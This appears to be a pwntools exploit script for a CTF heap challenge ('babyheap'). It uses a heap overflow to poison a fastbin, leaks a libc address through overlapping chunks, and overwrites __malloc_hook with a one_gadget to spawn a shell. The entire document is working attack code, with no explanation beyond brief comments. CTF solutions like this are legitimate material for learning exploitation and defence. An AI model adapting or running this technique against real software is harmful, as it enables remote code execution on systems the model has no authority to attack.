#!/usr/bin/python3
from pwn import *

elf = context.binary = ELF("babyheap_patched")
libc = ELF("./libc.so.6")

gs = '''
continue
'''
def start():
    if args.GDB:
        return gdb.debug(elf.path, gdbscript=gs)
    if args.REMOTE:
        return remote("address", 12345)
    else:
        return process(elf.path)

# Plan:
# Input size has to be a decimal number

# Addresses
libc_off = 0x3c4b78
one_off = 0x4526a

# Functions
malloc_counter = 0

def malloc(size: int):
    global malloc_counter
    io.sendlineafter(b"Command: ", b"1")
    io.sendlineafter(b"Size: ", str(size).encode())
    malloc_counter += 1

def free(index: int):
    global malloc_counter
    io.sendlineafter(b"Command: ", b"3")
    io.sendlineafter(b"Index: ", str(index).encode())
    malloc_counter -= 1

def fill(index: int, content: bytes):
    io.sendlineafter(b"Command: ", b"2")
    io.sendlineafter(b"Index: ", str(index).encode())
    io.sendlineafter(b"Size: ", str(len(content)).encode())
    io.sendlineafter(b"Content: ", content)

def dump(index: int):
    io.sendlineafter(b"Command: ", b"4")
    io.sendlineafter(b"Index: ", str(index).encode())
    io.recvuntil(b"\n")
    leak = io.recvline()
    return leak

io = start()

malloc(0x10) # 0: heap offset 0x00
malloc(0x10) # 1: 0x20
malloc(0x10) # 2: 0x40
malloc(0x10) # 3: 0x60
malloc(0x80) # 4: 0x80


free(2)
free(1)

payload = p64(0) * 3
payload += p64(0x21) # fastbins
payload += p8(0x80) # overwrite fastbin pointer
fill(0, payload) # make 1 point to 4 as the next chunk in the fastbin

# Modify 4 to fit size of fastbins to avoid crashing on size check
payload = p64(0) * 3
payload += p64(0x21) # fastbins
fill(3, payload)


# Reallocate the freed chunks
malloc(0x10) # 1
malloc(0x10) # 2 (the original index, because malloc thinks it is reallocating it)

# Restore size of 4
payload = p64(0) * 3
payload += p64(0x91)
fill(3, payload)

malloc(0x80) # To avoid top chunk consolidation
free(4) # put chunk 4 into unsortedbin

leak = dump(2)[:8]
leak = u64(leak)
log.success("Libc leak: %s" % hex(leak))
libc.address = leak - libc_off
log.info("Libc base: %s" % hex(libc.address))
log.info("Malloc hook: %s" % hex(libc.symbols['__malloc_hook']))

# Allocate a 0x70 size chunk. 0x60 + 0x10(metadata) = 0x70 size chunk
malloc(0x60) # Will be allocated from chunk 4 that was previously freed
free(4) # free it again to put intto 0x70 fastbin

# Write directly into chunk 4 by abusing that chunk 2 is still allocated at the same spot (I know its starting to get weird)
# You could also overwrite from chunk 3 into chunk 4 if that makes more sense to you
fill(2, p64(libc.symbols['__malloc_hook'] - 35)) # 35 = 0x23

malloc(0x60) # 5 Reallocate chunk 4. Now malloc_hook-35 is next in line
malloc(0x60) # 6 Allocate malloc_hook-35

one_gadget = libc.address + one_off

fill(6, b"A"*19 + p64(one_gadget))

# Also works
#payload = p8(0)*3
#payload += p64(0)*2 # total of 19 \x00 for padding
#payload += p64(one_gadget)
#fill(6, payload)

# Call malloc to get shell
malloc(1)

io.interactive()
